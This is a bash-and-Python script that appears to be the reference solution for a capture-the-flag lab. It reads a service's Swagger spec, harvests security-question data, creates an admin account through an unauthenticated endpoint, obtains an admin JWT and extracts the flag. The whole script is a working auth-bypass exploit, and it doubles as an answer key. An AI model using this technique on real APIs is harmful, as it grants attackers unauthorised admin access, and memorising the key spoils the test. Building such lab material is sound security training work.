#!/usr/bin/env bash
# ============================================================
# C2MZeroAuth (labs28) - reference solution: Swagger recon ->
# unauthenticated admin user creation -> signed admin JWT.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8108)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8108}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

flag="$(python3 - "$BASE" <<'PY'
import base64
import json
import re
import sys
import time
import urllib.parse
import urllib.request

base = sys.argv[1].rstrip("/")


def request(method, path, body=None, headers=None):
    data = None
    req_headers = {"Accept": "application/json"}
    if headers:
        req_headers.update(headers)
    if body is not None:
        data = json.dumps(body).encode()
        req_headers["Content-Type"] = "application/json"
    url = path if path.startswith("http") else base + path
    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    with urllib.request.urlopen(req) as response:
        return response.headers.get("Content-Type", ""), response.read().decode()


def json_request(method, path, body=None, headers=None):
    _, raw = request(method, path, body=body, headers=headers)
    return json.loads(raw)


def b64url_json(value):
    value += "=" * (-len(value) % 4)
    return json.loads(base64.urlsafe_b64decode(value).decode())


swagger = json_request("GET", "/swagger/v1/swagger.json")
paths = swagger["paths"]
for required_path in (
    "/api/v1/home/Publishdata",
    "/api/v1/home/TestDBConnection",
    "/api/GetSQDetail",
    "/api/CreateUser",
    "/api/GetAccessToken",
):
    if required_path not in paths:
        raise RuntimeError(f"expected path missing from swagger: {required_path}")

topic = paths["/api/v1/home/Publishdata"]["post"]["requestBody"]["content"]["application/json"][
    "examples"
]["monitoring"]["value"]["topic"]
request(
    "POST",
    "/api/v1/home/Publishdata",
    {"topic": topic, "message": "researcher_test"},
    headers={"Accept": "text/plain"},
)

db_check = json_request("GET", "/api/v1/home/TestDBConnection")
if db_check["status"] != "SUCCESS":
    raise RuntimeError("database smoke test did not respond")

email = paths["/api/GetSQDetail"]["get"]["parameters"][0]["example"]
sq_detail = json_request("GET", "/api/GetSQDetail?emailId=" + urllib.parse.quote(email))
if not sq_detail or len({sq_detail[0]["Answer1"], sq_detail[0]["Answer2"], sq_detail[0]["Pin"]}) != 1:
    raise RuntimeError("security-question endpoint did not expose repeated ciphertext")

username = f"researcher{int(time.time())}"
password = "Test@Pwn2026!"
created = json_request(
    "POST",
    "/api/CreateUser",
    {
        "firstName": "Bug",
        "lastName": "Test",
        "userName": username,
        "emailAddress": f"{username}@example.test",
        "password": password,
        "roleIDs": "requestmanageradmin",
        "groupID": 1,
    },
)
if "requestmanageradmin" not in created["data"]["RoleIDs"]:
    raise RuntimeError("created user did not receive admin role")

token_response = json_request(
    "POST",
    "/api/GetAccessToken",
    {"userName": username, "password": password},
)
access_token = token_response["data"]["Tokens"]["AccessToken"]
claims = b64url_json(access_token.split(".")[1])
user_claim = json.loads(claims["User"])
if "requestmanageradmin" not in user_claim["Roles"]:
    raise RuntimeError("JWT does not contain admin role")

admin_bundle = json_request(
    "GET",
    "/api/admin/fleet/breakglass",
    headers={"Authorization": "Bearer " + access_token},
)
match = re.search(r"FLAG\{nusasec-[0-9a-f]{32}\}", json.dumps(admin_bundle))
if not match:
    raise RuntimeError("flag not found in admin bundle")
print(match.group(0))
PY
)"

if ! grep -Eq "^$FLAG_RE$" <<<"${flag:-}"; then
  echo "[-] failed: exploit did not print a valid arena flag" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
